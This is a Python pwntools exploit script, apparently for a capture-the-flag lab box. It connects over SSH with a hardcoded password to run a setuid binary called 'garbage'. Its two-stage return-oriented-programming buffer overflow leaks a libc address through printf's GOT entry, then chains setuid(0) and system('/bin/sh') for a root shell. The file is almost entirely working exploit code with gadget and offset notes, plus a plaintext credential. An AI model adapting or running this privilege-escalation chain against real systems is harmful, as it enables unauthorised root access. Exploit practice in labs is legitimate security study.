from pwn import *

context(terminal=['tmux','new-window'])
s = ssh(host='10.10.10.139',user='margo',password='iamgod$08')
p = s.process('/usr/bin/garbage')
#p = process('./garbage',setuid=True)

#p=gdb.debug('./garbage','b main')
#p = process('./garbage2', shell=True)
#p  = remote("localhost",10103)

#elf = context.binary = ELF('garbage')
#p = process(elf.path)
context(os='linux', arch='amd64')
context.log_level = 'debug'
#0x000000000040179b: pop rdi; ret;
#401090:       ff 25 b2 2f 00 00       jmpq   *0x2fb2(%rip)        # 404048 <printf@GLIBC_2.2.5>

#401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
#libc version used is libc6_2.27-3ubuntu1_amd64
pop_rdi = p64(0x40179b)
printf_plt = p64(0x401090)
printf_got = p64(0x404048)
puts_got = p64(0x404028)
main_addr = p64(0x401619)

junk = "A" * 136

#stage1
#we need a pop rdi
#we need a printf, since puts isnt called in main on normal flow, addy wouldnt be populated in plt
#we need got of puts
testpayload = junk + pop_rdi + puts_got + printf_plt + main_addr 
payload = junk + pop_rdi + printf_got + printf_plt + main_addr

#wonky stuff
sleep(5)
p.sendline(payload)
sleep(3)


p.recvuntil("denied.")
#leaked_addr =p.recv()[:7].strip().ljust(8,"\x00")
leaked_addr = p.recvn(7).strip().ljust(8,"\x00")
leaked_puts = u64(leaked_addr)
#stage2
log.success("Leaked printfs@glibc:{}".format(hex(leaked_puts)))

p.recvuntil("password: ")


#we need to calculate the offset
#need to call suid and pass it 0
#then we need to call system /bin/sh
#

#23: 00000000000e5970   144 FUNC    WEAK   DEFAULT   13 setuid@@GLIBC_2.2.5
#1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
#422: 00000000000809c0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
#627: 0000000000064e80   195 FUNC    GLOBAL DEFAULT   13 printf@@GLIBC_2.2.5
#1b3e9a /bin/sh

libc_setuid = 0xe5970
libc_system = 0x4f440
libc_puts =0x809c0
libc_printf =0x64e80
libc_sh = 0x1b3e9a
#offset = leaked_puts - libc_puts
offset = leaked_puts - libc_printf
payload2=""
payload2+= junk
payload2+= pop_rdi  
payload2+= p64(0)
payload2+= p64(offset+ libc_setuid)
payload2+= pop_rdi
payload2+= p64(offset+ libc_sh)
payload2+= p64(offset + libc_system)

p.sendline(payload2)

p.interactive() 
